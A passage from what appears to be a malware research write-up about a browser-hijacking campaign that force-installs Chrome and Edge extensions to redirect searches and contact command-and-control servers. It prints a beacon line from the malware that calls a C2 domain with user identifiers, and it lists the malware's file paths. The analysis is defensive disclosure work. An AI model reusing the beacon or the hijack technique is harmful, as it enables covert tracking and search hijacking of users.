src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%27233%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg21.70f31772.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg21.70f31772.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg21.70f31772.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p>The domain of “Micro Search” (microsearch[.]me) was the same as the previously removed extension, however it was removed from the Chrome Web Store on April 25th. The distribution method remains the same, along with all of the previous domains. It is impressive how under the radar this malware is given that it has been operating for years without even changing its C2 domains, probably because it hasn’t needed to. By counting the number of users on each extension related to the campaigns, over 200,000 users have been affected by the malware.</p><h3 id="mee" class="subtitle1 subtitle1_bold">Microsoft Edge Extension</h3><p>We have witnessed force installations of Microsoft Edge extensions, along with Google Chrome extensions. One of the most widespread is an extension with 100,000+ users called “Simple New Tab”. On the Microsoft Edge Add-ons page, the extension is described as “replacing the new tab page with beautiful backgrounds”.</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%27314%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg22.0a072a30.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg22.0a072a30.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg22.0a072a30.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p>On the same page, we see that 52 users chose to rate the extension with 1 star, along with some angry reviews.</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27528%27%20height=%27617%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg23.5d0c75f3.png&amp;w=576&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg23.5d0c75f3.png&amp;w=1200&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg23.5d0c75f3.png&amp;w=1200&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p>When examining the extension’s code, we can see that it does more than just replace the beautiful backgrounds.</p><p>We can see evidence of search takeover inside the code of index.html:</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%27245%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg24.91d5812f.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg24.91d5812f.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg24.91d5812f.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p>If we install the Edge extension manually, the Edge will first block it because it changes the new tab page settings. It is possible that if forcefully installed, like when delivered by the malicious script, Edge will not show this message.</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%27208%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg25.54561e7d.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg25.54561e7d.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg25.54561e7d.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p>After closing the browser, the first page that will load is “yandex[.]by”. The new tab’s search default remains as Bing.</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%27317%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg26.25fd5072.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg26.25fd5072.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg26.25fd5072.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p>Searching from the top bar will result in the use of the default search provider. However, when clicking on the search in the middle of the page, users will be redirected to Yahoo.</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%2758%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg27.9f1d5479.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg27.9f1d5479.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg27.9f1d5479.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%2752%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg28.2b2b9957.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg28.2b2b9957.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg28.2b2b9957.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%2753%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg29.5f8e0b90.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg29.5f8e0b90.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg29.5f8e0b90.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><h3 id="csb" class="subtitle1 subtitle1_bold">“Custom Search Bar” Code Overview</h3><p>While the explanation below relates to the already removed extension, most of the new versions are even simpler than this and only contain the manifest file without any JS code.</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%27155%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg30.df326386.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg30.df326386.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg30.df326386.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p>As you can see, it had many nice reviews:</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27720%27%20height=%27884%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg31.09f6e427.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg31.09f6e427.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg31.09f6e427.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p>So let’s find out what’s happening inside the Chrome extension’s code. First, it takes over the search by defining the “search_url” field. It fills it with a domain we’ve seen before on the PowerShell analysis - “customsearchbar[.]me”:</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27744%27%20height=%27372%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg32.545949f5.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg32.545949f5.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg32.545949f5.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p>It sets its only js file “bg.js” which is a short 100-line script to run in the background.</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27304%27%20height=%2787%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg33.cfd611f7.png&amp;w=320&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg33.cfd611f7.png&amp;w=768&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg33.cfd611f7.png&amp;w=768&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p>The script “bg.js” has only three functions: SaveUID, GenerateUID, and main.</p><p>GenerateUID and SaveUID do as their name suggests, and generate an ID with some mathematical improvisations. Then in SaveUID with “chrome.storage.sync.get” to get stored values of “uid” and “src”, and the value that is stored in the cookie of “costumesearchbar” in “_uid”. It does an “AND” with the cookie and performs an “OR” on the generated UID that is returned from the function. It then saves it in the logged-in user’s storage, using “chrome.storage.sync.set”. It will do the same to “_src”, however this time it will “OR” it with a fixed value ‘rg_om’.</p><p>The main function uses an important process called “chrome.declarativeNetRequest.updateDynamicRules” to replace values of parameters from the URL, which redirects the user’s search request from the search page with the URL of “customsearchbar[.]me/search*”, and injects parameters “u” and “s” which represents the uid and src parameters from before.</p><p>Following this action, it will receive the extension’s current version and execute an HTTP request to the C2 server, but this time to the backend (“/api/ext_ping”) with information from the UID and extension version. This request is forwarded to another server: securedatacorner[.]com with the same URL parameters.</p><pre class="styles_Article-Code__V7O9i">let extVersion = chrome.runtime.getManifest().version;
fetch(`https[://]<span class="text-[#FD766C]">customsearchbar</span>[.]me/<span class="text-[#FD766C]">api/ext_ping</span>?uid=${result.uid}&amp;extID=${chrome.runtime.id}&amp;extVersion=${<span class="text-[#FD766C]">extVersion</span>}`)</pre><p>The code of this Chrome extension and of the new extensions that have just recently been uploaded to the Chrome store is the same:</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27369%27%20height=%27540%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg34.c525f69d.png&amp;w=384&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg34.c525f69d.png&amp;w=768&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg34.c525f69d.png&amp;w=768&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27352%27%20height=%27540%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg35.80607ebf.png&amp;w=384&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg35.80607ebf.png&amp;w=768&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg35.80607ebf.png&amp;w=768&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p>There are also simpler extensions like “dafkaabahcikblhbogbnbjodajmhbini” that are delivered in this flow, but which don’t contain any javascript files - just a manifest that is responsible for setting the search URL to “yoursearchbar[.]me/search?q=<!-- -->{searchTerms}<!-- -->&amp;s=rg”</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%27270%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg36.856aa674.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg36.856aa674.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg36.856aa674.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><h2 id="mle" class="h3 h3_bold">Malicious Local Extension</h2><p>The extension at this stage is the one that was downloaded from the C2 and saved to C:\Windows\InternalKernelGrid. Most of the files are heavily obfuscated. This local extension can intercept all web requests, and send them to the C2. It can save information at local storage, send it to the C2, receive commands and encrypted scripts from the C2, and inject and load scripts into all pages.</p><p>In addition, it hijacks search queries and trafficks them through its servers and then on to other search engines. The version that we got is 9.5 and it has many files (the new version already exists with 9.8):</p><pre class="styles_Article-Code__V7O9i">C:\Windows\InternalKernelGrid\analytics.js
C:\Windows\InternalKernelGrid\background.html
C:\Windows\InternalKernelGrid\bg.js
C:\Windows\InternalKernelGrid\bg_fallback.js
C:\Windows\InternalKernelGrid\config.js
C:\Windows\InternalKernelGrid\content.js
C:\Windows\InternalKernelGrid\crypto-js.min.js
C:\Windows\InternalKernelGrid\devtools.html
C:\Windows\InternalKernelGrid\devtools.js
C:\Windows\InternalKernelGrid\extensions_page.css
C:\Windows\InternalKernelGrid\extensions_page.js
C:\Windows\InternalKernelGrid\icon.png
C:\Windows\InternalKernelGrid\manifest.json
C:\Windows\InternalKernelGrid\version.txt</pre><p>We can see from the manifest file that the malicious extension calls itself “Google Updater”, and runs content scripts on all URLs and also on chrome://extensions. It asks for too many powerful permissions and also asks to be able to run scripts from its C2 domains:</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27631%27%20height=%27624%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" 